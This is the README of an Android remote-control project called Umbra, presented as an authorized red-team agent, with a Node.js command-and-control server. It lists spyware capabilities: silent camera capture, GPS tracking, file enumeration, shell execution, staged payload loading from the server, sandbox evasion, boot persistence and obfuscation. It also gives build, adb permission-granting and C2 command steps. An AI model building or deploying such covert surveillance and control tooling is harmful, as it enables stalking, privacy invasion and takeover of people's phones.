# Umbra — Android 16 Red Team Agent

Clean-slate Kotlin agent for authorized security testing on Android 16 / One UI 8.5.

## Architecture

| Layer | Stack |
|---|---|
| Language | Kotlin 2.2 |
| UI | Jetpack Compose + Material 3 |
| Async | Coroutines + WorkManager |
| C2 Transport | OkHttp WebSocket (WSS) + FCM |
| Crypto | AES-256-GCM (javax.crypto) |
| Serialization | kotlinx.serialization |
| Build | AGP 9.2, Gradle 9.4, JDK 21 |

## Package

`dev.yassine.umbra`

## Project Structure

```
Umbra/
├── app/                          # Android client
│   └── src/main/java/dev/yassine/umbra/
│       ├── MainActivity.kt
│       ├── core/
│       │   ├── CryptoEngine.kt       # AES-256-GCM
│       │   ├── SandboxDetector.kt    # Anti-emulator/sandbox
│       │   ├── InfoModule.kt         # Device fingerprint
│       │   ├── UmbraEngine.kt        # Central orchestrator
│       │   └── StageLoader.kt        # DexClassLoader staging
│       ├── c2/
│       │   ├── WebSocketTransport.kt # OkHttp WSS client
│       │   ├── CommandDispatcher.kt  # Command routing
│       │   ├── C2Coordinator.kt      # WS + FCM hybrid
│       │   └── UmbraFcmService.kt    # Firebase push receiver
│       ├── persistence/
│       │   ├── UmbraService.kt       # specialUse foreground service
│       │   ├── BootReceiver.kt       # BOOT_COMPLETED handler
│       │   ├── KeepAliveWorker.kt    # CoroutineWorker restart
│       │   ├── PersistenceChain.kt   # Entry point
│       │   └── BatteryPrompt.kt      # Samsung bypass dialog
│       └── modules/
│           ├── CameraModule.kt       # CameraX silent capture
│           ├── LocationModule.kt     # FusedLocationProvider
│           ├── FileModule.kt         # MediaStore (no MANAGE_EXTERNAL_STORAGE)
│           └── ShellModule.kt        # Runtime exec()
├── server/                      # Node.js C2 server
│   ├── index.js                     # Express + Socket.IO + TLS
│   ├── crypto.js                    # AES-256-GCM (matches Android)
│   ├── fcm.js                       # Firebase Admin SDK push
│   └── stage2/                      # Encrypted Stage 2 DEX directory
└── README.md
```

## Features

- Foreground service with `specialUse` type — survives Doze
- BOOT_COMPLETED → WorkManager(10s) → Service chain (Android 15+ safe)
- Samsung One UI "Never sleeping" battery bypass prompt
- OkHttp WebSocket C2 with exponential backoff reconnection
- AES-256-GCM encrypted payloads (all traffic)
- Firebase Cloud Messaging for Doze/Deep Sleep wake-up
- DexClassLoader staged payload (Stage 2 DEX from C2)
- Anti-emulator/sandbox detection (sensors, telephony, battery, uptime)
- CameraX silent capture (no preview)
- FusedLocationProvider high-accuracy GPS
- MediaStore file enumeration (no MANAGE_EXTERNAL_STORAGE)
- Shell command execution
- R8 obfuscation (release builds)

## Build (Android Client)

```bash
export JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr
./gradlew assembleDebug
```

Output: `app/build/outputs/apk/debug/app-debug.apk`

## C2 Server

```bash
cd server
npm install
node index.js
```

Listens on `wss://0.0.0.0:8443/c2`. Auto-generates self-signed TLS certs.
Place `firebase-admin-key.json` in server/ for FCM push capability.

### Endpoints

| Method | Path | Purpose |
|---|---|---|
| GET | /api/health | Server status |
| GET | /api/devices | List registered devices |
| GET | /api/stage2 | Serve encrypted Stage 2 DEX |
| POST | /api/register-fcm | Register device FCM token |
| POST | /api/command | Queue command for device |
| POST | /api/result | Receive encrypted result |
| WS | /c2 | Device WebSocket channel |

## Install on Device

```bash
adb install app/build/outputs/apk/debug/app-debug.apk
adb shell pm grant dev.yassine.umbra android.permission.POST_NOTIFICATIONS
adb shell pm grant dev.yassine.umbra android.permission.CAMERA
adb shell pm grant dev.yassine.umbra android.permission.ACCESS_FINE_LOCATION
adb shell pm grant dev.yassine.umbra android.permission.READ_MEDIA_IMAGES
adb shell pm grant dev.yassine.umbra android.permission.READ_MEDIA_VIDEO
adb shell pm grant dev.yassine.umbra android.permission.READ_PHONE_STATE
adb shell am start -n dev.yassine.umbra/.MainActivity
```

## Verify Persistence

```bash
adb shell dumpsys activity services dev.yassine.umbra
adb shell ps -A | grep umbra
adb shell dumpsys deviceidle force-idle  # test Doze survival
```

## Test C2

```bash
# Register device FCM token (server-side)
curl -k -X POST https://localhost:8443/api/register-fcm \
  -H "Content-Type: application/json" \
  -d '{"device_id":"ANDROID_ID","fcm_token":"TOKEN"}'

# Send command
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"ANDROID_ID","module":"ping","action":"ping","params":{}}'

# List devices  
curl -k https://localhost:8443/api/devices
```

## Test Device

Samsung Galaxy S25 Ultra (SM-S938B) — One UI 8.5 / Android 16 / API 37

## License

Educational — authorized lab use only.
